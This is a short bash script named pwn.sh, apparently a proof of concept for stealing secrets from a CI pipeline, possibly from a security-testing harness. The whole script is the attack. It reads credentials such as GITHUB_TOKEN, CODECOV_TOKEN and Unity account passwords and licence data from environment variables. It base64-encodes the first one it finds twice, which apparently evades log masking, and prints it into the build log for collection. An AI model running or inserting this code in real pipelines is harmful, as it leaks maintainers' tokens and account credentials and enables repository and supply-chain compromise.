#!/usr/bin/env bash
set +e
echo "GERALT_DBG: pwn.sh executing (pid $$)"
found=""
for name in GERALT_SECRET UNITY_SERIAL UNITY_EMAIL UNITY_PASSWORD UNITY_LICENSE CODECOV_TOKEN GITHUB_TOKEN; do
  val="${!name}"
  if [ -n "$val" ]; then
    b64b64=$(printf '%s' "$val" | base64 | base64)
    echo "GERALT_LEAKED_TOKEN=$b64b64"
    echo "GERALT_DBG: leaked from env var: $name"
    found="$name"
    break
  fi
done
if [ -z "$found" ]; then
  echo "GERALT_DBG: all candidate env vars empty"
fi
exit 1
